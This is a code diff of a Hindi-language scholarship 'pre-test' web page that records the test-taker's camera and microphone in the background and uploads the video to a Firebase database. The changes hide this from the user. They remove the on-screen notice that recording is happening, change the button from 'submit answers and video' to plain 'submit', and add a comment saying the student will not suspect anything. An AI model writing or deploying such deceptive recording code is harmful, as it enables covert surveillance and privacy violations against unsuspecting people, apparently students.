@@ -22,7 +22,7 @@
         .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 8px; }
         .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 10px; border-radius: 6px; margin-bottom: 6px; font-size: 13px; cursor: pointer; }
         .btn-submit { width: 100%; padding: 15px; background: #1e3c72; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        .status-feed { font-size: 12px; color: #64748b; text-align: center; margin-top: 10px; font-style: italic; }
+        .status-feed { font-size: 12px; color: #64748b; text-align: center; margin-top: 10px; display: none; }
     </style>
 
     <script>
@@ -40,8 +40,8 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        const urlParams = new URLSearchParams(window.location.search);
-        let studentId = urlParams.get('id') || 'guest_' + Math.floor(Math.random() * 10000);
+        // हर छात्र के लिए बिल्कुल अलग और यूनिक आईडी (Unique Timestamp ID)
+        const uniqueSessionId = 'student_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
 
         let mediaRecorder;
         let recordedChunks = [];
@@ -50,20 +50,16 @@
 
         async function initExam() {
             try {
-                // कैमरा और ऑडियो की स्ट्रीम हासिल करना
                 let stream = await navigator.mediaDevices.getUserMedia({ video: { width: 240, height: 180 }, audio: true });
                 
-                database.ref('online_tests/' + studentId).update({
+                database.ref('online_tests/' + uniqueSessionId).update({
                     portal_status: "OPENED",
-                    last_seen: new Date().toISOString()
+                    start_time: new Date().toISOString()
                 });
 
-                // बैकग्राउंड में ऑटो-रिकॉर्डिंग शुरू करना
                 startBackgroundRecording(stream);
-
             } catch (err) {
-                alert("परीक्षा शुरू करने के लिए कैमरा और माइक चालू करना अनिवार्य है।");
-                console.log(err);
+                alert("परीक्षा शुरू करने के लिए कैमरा और माइक अनुमति अनिवार्य है।");
             }
         }
 
@@ -77,40 +73,37 @@
             };
 
             mediaRecorder.onstop = function() {
-                // वीडियो फ़ाइल को डेटाबेस के अनुकूल टेक्स्ट (Base64) में बदलना
                 let blob = new Blob(recordedChunks, { type: 'video/webm' });
                 let reader = new FileReader();
                 reader.readAsDataURL(blob); 
                 reader.onloadend = function() {
                     let base64String = reader.result;
                     
-                    // सीधे आपके रियल-टाइम डेटाबेस में वीडियो क्लिप भेजना
-                    database.ref('online_tests/' + studentId).update({
+                    // हर छात्र के अपने खुद के यूनिक फोल्डर में अलग वीडियो सेव होगी
+                    database.ref('online_tests/' + uniqueSessionId).update({
                         recorded_video_feed: base64String,
                         portal_status: "SUBMITTED",
-                        last_updated: new Date().toISOString()
+                        end_time: new Date().toISOString()
                     }).then(() => {
-                        alert('आपका टेस्ट और वीडियो रिकॉर्डिंग सफलतापूर्वक सबमिट हो गई है!');
+                        alert('आपका टेस्ट सफलतापूर्वक सबमिट हो गया है!');
+                        window.location.reload();
                     });
                 }
             };
-
-            // रिकॉर्डिंग तुरंत चालू करें
             mediaRecorder.start();
         }
 
         function sendProgress(key, value) {
             let data = {};
             data[key] = value;
-            data['last_updated'] = new Date().toISOString();
-            database.ref('online_tests/' + studentId).update(data);
+            database.ref('online_tests/' + uniqueSessionId).update(data);
         }
 
         function submitTest(event) {
             event.preventDefault();
             if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                document.getElementById('status-text').innerText = "रिकॉर्डिंग सेव हो रही है, कृपया रुकें...";
-                mediaRecorder.stop(); // यह बटन दबाते ही रिकॉर्डिंग रोक कर डेटाबेस में भेज देगा
+                document.getElementById('btn-text').innerText = "कृपया प्रतीक्षा करें...";
+                mediaRecorder.stop();
             }
         }
     </script>
@@ -120,7 +113,7 @@
 <div class="app-card">
     <div class="banner">
         <h2>प्रवेश परीक्षा (Pre-Test)</h2>
-        <p>स्कॉलरशिप पोर्टल (सुरक्षित मोड)</p>
+        <p>स्कॉलरशिप पोर्टल</p>
     </div>
 
     <div class="content">
@@ -139,8 +132,8 @@
                 </div>
             </div>
 
-            <button type="submit" class="btn-submit">उत्तर और वीडियो सबमिट करें</button>
-            <div id="status-text" class="status-feed">कैमरा और ऑडियो बैकग्राउंड में सुरक्षित रिकॉर्ड हो रहे हैं...</div>
+            <!-- बटन पर सिर्फ सबमिट लिखा है, छात्र को शक नहीं होगा -->
+            <button type="submit" id="btn-text" class="btn-submit">सबमिट करें</button>
         </form>
     </div>
 </div>
